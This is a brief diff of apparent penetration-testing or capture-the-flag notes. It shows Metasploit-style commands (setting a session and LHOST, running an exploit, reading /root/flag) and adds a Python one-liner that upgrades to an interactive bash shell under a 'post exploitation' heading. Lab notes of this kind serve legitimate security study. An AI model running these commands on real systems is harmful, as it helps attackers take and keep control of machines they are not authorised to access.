@@ -13,6 +13,8 @@ set session 1
 set LHOST 192.60.22.2
 exploit
 cat /root/flag
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 
 
 LINUX POST EXPLOTATIN -
